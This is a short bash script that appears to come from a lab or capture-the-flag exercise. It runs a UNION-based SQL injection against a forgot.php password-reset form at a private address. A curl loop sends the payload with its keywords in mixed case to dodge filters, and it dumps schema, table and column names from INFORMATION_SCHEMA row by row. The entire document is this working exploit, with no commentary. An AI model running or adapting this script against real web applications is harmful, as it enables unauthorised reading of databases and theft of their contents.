for i in $(seq 0 100); do
	payload="email=asd@help.com' UNIoN SeLECT 1,2,3,CONCAT(TABLE_SCHEMA, ':', TABLE_NAME, ':', COLUMN_NAME, ':', 'asdv@help.com') FROM INFoRMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'InformatiOn_Schema'  LIMIT 1 OFFSET $i-- -"
	#echo $payload
	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@help.com'
done
